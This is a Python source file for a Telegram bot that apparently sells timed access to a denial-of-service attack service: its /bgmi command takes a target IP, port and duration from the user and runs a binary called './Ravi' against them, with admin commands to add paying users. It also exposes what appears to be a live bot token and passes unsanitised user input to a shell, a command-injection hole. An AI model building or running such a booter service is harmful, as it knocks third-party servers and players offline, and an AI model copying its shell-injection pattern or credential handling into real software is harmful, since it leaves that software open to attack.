import time
import subprocess
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext
import os

BOT_TOKEN = os.getenv("7432153187:AAHhVYbK5PCkEHN7TELau_VC9KktKOvPT9I")
ADMIN_ID = 8179218740  

AUTHORIZED_USERS = {}

def execute_binary(ip, port, attack_time):
    command = f"./Ravi {ip} {port} {attack_time} 900"
    try:
        subprocess.run(command, shell=True, check=True)
        print("✅ Binary executed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"❌ Error executing binary: {e}")

# START COMMAND
def start(update: Update, context: CallbackContext) -> None:
    user = update.message.from_user
    username = user.first_name  

    welcome_message = f"""
👋🏻 𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {username} 💀! 🔥
━━━━━━━━━━━━━━━━━━━━━
🤖 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗕𝗢𝗧!
🚀 𝗘𝗻𝗷𝗼𝘆 𝗵𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!

📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:
━━━━━━━━━━━━━━━━━━━━━
📌 𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:
/bgmi - 🚀 Start an attack!

👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬: @SIDIKI_MUSTAFA_47 💀
"""

    keyboard = [
        [InlineKeyboardButton("🚀 CLICK HERE TO JOIN 🚀", url="https://t.me/MUSTAFALEAKS2")],
        [InlineKeyboardButton("👑 BOT CREATED BY 👑", url="https://t.me/SIDIKI_MUSTAFA_47")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    update.message.reply_text(welcome_message, reply_markup=reply_markup)

# HELP COMMAND
def help_command(update: Update, context: CallbackContext) -> None:
    help_text = """
📋 **𝗕𝗢𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗚𝗨𝗜𝗗𝗘** 📋
━━━━━━━━━━━━━━━━━━━━━
`/start` — 👋🏻 Welcome Message  
`/help` — 📋 Shows All Commands  
`/status` — 🟢 Check Your Subscription Status  
`/bgmi <ip> <port> <time>` — 🚀 Start Attack  
`/add <user_id> <duration> <unit>` — ➕ Add New User (Admin Only)  
`/remove <user_id>` — ❌ Remove User (Admin Only)  
`/users` — 📜 List All Authorized Users (Admin Only)  
━━━━━━━━━━━━━━━━━━━━━
⚡ **Need Support?** Contact [Support Team](https://t.me/SIDIKI_MUSTAFA_47)
"""
    update.message.reply_text(help_text, parse_mode='Markdown')

# STATUS COMMAND
def status(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    username = update.message.from_user.first_name

    if user_id in AUTHORIZED_USERS:
        expiry_time = AUTHORIZED_USERS[user_id]
        time_left = expiry_time - datetime.now()
        update.message.reply_text(f"👤 **User:** {username}\n🆔 **ID:** {user_id}\n💎 **Subscription:** ✅ ACTIVE\n⏳ **Time Left:** {time_left}")
    else:
        update.message.reply_text(f"👤 **User:** {username}\n🆔 **ID:** {user_id}\n💎 **Subscription:** ❌ INACTIVE")

# BGMI COMMAND
def bgmi(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ **You are not authorized to use this command!**")
        return

    if len(context.args) < 3:
        update.message.reply_text("📌 **Usage:** `/bgmi <ip> <port> <time>`")
        return

    ip, port, attack_time = context.args[:3]

    # 🚀 Attack Start Message
    attack_start_message = f"""
🚀 **ＡＴＴＡＣＫ ＩＮＩＴＩＡＴＥＤ!** 🚀
━━━━━━━━━━━━━━━━━━━
🎯 **ＴＡＲＧＥＴ:** `{ip}`
📡 **ＰＯＲＴ:** `{port}`
⏳ **ＤＵＲＡＴＩＯＮ:** `{attack_time} SEC`
💥 **ＳＴＡＴＵＳ:** **🔥 𝐋𝐀𝐔𝐍𝐂𝐇𝐈𝐍𝐆 𝐍𝐎𝐖! 🔥**
━━━━━━━━━━━━━━━━━━━
⚡ **ＳＴＡ𝐘 Ｃ𝐎ＮＮ𝐄Ｃ𝐓𝐄𝐃 𝐅𝐎𝐑 𝐔𝐏𝐃𝐀𝐓𝐄𝐒!**
"""
    update.message.reply_text(attack_start_message)

    execute_binary(ip, port, attack_time)

    # ✅ Attack Completed Message
    attack_end_message = f"""
✅ **ＡＴＴＡＣＫ ＣＯＭＰＬＥＴＥＤ!** ✅
━━━━━━━━━━━━━━━━━━━
🎯 **ＴＡＲＧＥＴ:** `{ip}`
📡 **ＰＯＲＴ:** `{port}`
🕒 **ＤＵＲＡＴＩＯＮ:** `{attack_time} SEC`
🎯 **ＳＴＡＴＵＳ:** **✅ SUCCESSFULLY EXECUTED!**
━━━━━━━━━━━━━━━━━━━
"""
    update.message.reply_text(attack_end_message)

# ADD COMMAND
def add_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **Only Admin can add users!**")
        return

    if len(context.args) < 3:
        update.message.reply_text("❌ **Usage:** /add `<user_id>` `<duration>` `<unit>`")
        return

    try:
        user_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower()

        if unit == "minutes":
            expiry_time = datetime.now() + timedelta(minutes=duration)
        elif unit == "hours":
            expiry_time = datetime.now() + timedelta(hours=duration)
        elif unit == "days":
            expiry_time = datetime.now() + timedelta(days=duration)
        elif unit == "weeks":
            expiry_time = datetime.now() + timedelta(weeks=duration)
        elif unit == "months":
            expiry_time = datetime.now() + timedelta(days=duration * 30)  
        else:
            update.message.reply_text("❌ **Invalid unit! Use `minutes`, `hours`, `days`, `weeks`, or `months`.**")
            return

        AUTHORIZED_USERS[user_id] = expiry_time
        update.message.reply_text(f"✅ **User {user_id} added for {duration} {unit}!**")

    except ValueError:
        update.message.reply_text("❌ **Invalid input! Use numbers only.**")

# REMOVE COMMAND
def remove_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **You are not authorized to remove users!**")
        return

    if len(context.args) < 1:
        update.message.reply_text("❌ **Usage:** /remove `<user_id>`")
        return

    try:
        user_id = int(context.args[0])
        if user_id in AUTHORIZED_USERS:
            del AUTHORIZED_USERS[user_id]
            update.message.reply_text(f"✅ **User {user_id} successfully removed!**")
        else:
            update.message.reply_text("❌ **User not found in authorized users list!**")
    except ValueError:
        update.message.reply_text("❌ **Invalid input! Use numbers only.**")

# USERS COMMAND
def list_users(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **You are not authorized to view users!**")
        return

    if not AUTHORIZED_USERS:
        update.message.reply_text("📌 **No authorized users found!**")
        return

    user_list = "\n".join([f"👤 **User ID:** `{user_id}` - ⏳ Expires: {expiry_time}" for user_id, expiry_time in AUTHORIZED_USERS.items()])
    update.message.reply_text(f"📋 **Authorized Users:**\n\n{user_list}")

# BOT INITIALIZATION
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))  
    dp.add_handler(CommandHandler("status", status))
    dp.add_handler(CommandHandler("bgmi", bgmi, pass_args=True))
    dp.add_handler(CommandHandler("add", add_user, pass_args=True))
    dp.add_handler(CommandHandler("remove", remove_user, pass_args=True))
    dp.add_handler(CommandHandler("users", list_users))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()